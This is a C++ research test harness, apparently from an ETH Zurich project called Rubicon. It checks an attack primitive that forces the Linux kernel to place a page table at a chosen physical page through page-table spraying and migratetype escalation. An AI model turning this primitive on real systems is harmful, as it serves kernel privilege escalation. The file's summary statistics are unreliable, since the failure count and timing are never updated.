/*
 * Copyright (C) 2025 Matej Bölcskei, ETH Zurich
 * Licensed under the GNU General Public License as published by the Free Software Foundation, version 3.
 * See LICENSE or <https://www.gnu.org/licenses/gpl-3.0.html> for details.
 *
 * SPDX-License-Identifier: GPL-3.0-only
 */

#include "rubench.hpp"
#include "rubicon.hpp"

#include <cstdio>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>

int pt_spray_bait_allocator(void* ctx) {
    return pt_spray_tables(*static_cast<pt_spray_args_t*>(ctx));
}

struct pt_install_ctxt {
    int fd;
    void* fd_ptr;
    void* pt_mapped;
};

pt_install_ctxt pt_install(void* page_block, void* pt_target) {
    auto pt_ctxt = pt_install_ctxt{};

    const char* buf = "ffffffffffffffff";
    pt_ctxt.fd      = open("/dev/shm", O_TMPFILE | O_RDWR, S_IRUSR | S_IWUSR);
    write(pt_ctxt.fd, buf, 8);
    pt_ctxt.fd_ptr = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                          MAP_SHARED | MAP_POPULATE, pt_ctxt.fd, 0);
    mlock(pt_ctxt.fd_ptr, PAGE_SIZE);

    void* bait_ptr  = (void*)((unsigned long)page_block + PAGEBLOCK_SIZE / 2);
    auto spray_args = pt_spray_args_t{
        .start = (void*)SPRAY_START,
        .fd = pt_ctxt.fd,
        .nr_tables = NR_PAGE_TABLES_SPRAY,
    };

    migratetype_escalation(bait_ptr, 9, pt_spray_bait_allocator,
                           &spray_args);
    pt_unspray_tables(spray_args);

    // Move the target as next candidate for page table allocation
    munlock(pt_target, PAGE_SIZE);
    block_merge(pt_target, 0);
    // Install the page table at the target.
    pt_ctxt.pt_mapped = mmap(spray_args.start + PAGEBLOCK_SIZE, PAGE_SIZE,
                             PROT_READ | PROT_WRITE,
                             MAP_FIXED | MAP_SHARED | MAP_POPULATE,
                             pt_ctxt.fd,
                             0);

    return pt_ctxt;
}

int main() {
    rubench_open();

    int num_rounds       = 100;
    long long total_time = 0;
    int num_fails        = 0;

    for(int round = 0; round < num_rounds; round++) {
        printf("Round %d\n", round);

        void* pageblock = get_page_block();
        void* target    = (void*)((unsigned long)pageblock + TARGET_OFFSET);
        mlock((void*)(unsigned long)target, PAGE_SIZE);
        unsigned long target_phys = rubench_va_to_pa(target);

        auto pt_ctxt = pt_install(pageblock, target);

        unsigned long value = rubench_read_phys(target_phys);
        auto file_phys      = rubench_va_to_pa(pt_ctxt.fd_ptr);

        printf("Pageblock physical address: %lx\n", target_phys);
        printf("File physical address: %lx\n", file_phys);
        printf("Value read from target: %lx\n", value);
        auto success = (value & 0xFFFFFFFFF000) == file_phys;

        if(success) {
            printf("PASS\n");
        } else {
            printf("FAIL\n");
        }

        close(pt_ctxt.fd);
        munlock(pt_ctxt.fd_ptr, PAGE_SIZE);
        munmap(pt_ctxt.fd_ptr, PAGE_SIZE);
        munmap(pt_ctxt.pt_mapped, PAGE_SIZE);

        munmap(pageblock, PAGEBLOCK_SIZE);
    }

    printf("Number of failed tests: %d\n", num_fails);
    printf("Average time taken: %lld ns\n",
           total_time / (num_rounds - num_fails));

    rubench_close();
    return 0;
}